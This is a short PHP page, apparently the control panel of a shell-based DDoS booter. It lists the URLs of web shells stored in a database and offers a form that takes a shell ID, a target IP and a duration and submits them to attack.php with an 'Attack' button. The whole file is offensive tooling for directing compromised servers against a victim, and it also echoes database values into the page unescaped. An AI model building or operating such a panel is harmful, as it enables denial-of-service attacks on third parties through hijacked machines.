<?php

include 'includes/init.php';

$result = mysql_query("SELECT * FROM shells") or die (mysql_error());

while ($row = mysql_fetch_assoc($result))  
{
	echo "{$row['id']} : <a href=\"{$row['shellurl']}\">{$row['shellurl']}</a> <br /><br />";
}
	echo'
	Write all in Shell ID to attack with all shells!<br />
	<form action="attack.php" method="get">
	<b>Shell ID:</b> <input type="text" size="20" maxlength="15" name="shellid" /><br />
	<b>IP:</b> <input type="text" size="20" maxlength="15" name="host" /><br />
	<b>Time:</b> <input type="text" size="20" name="time" /><br />
	<input type="submit" value="Attack" />
	</form>
	';
?>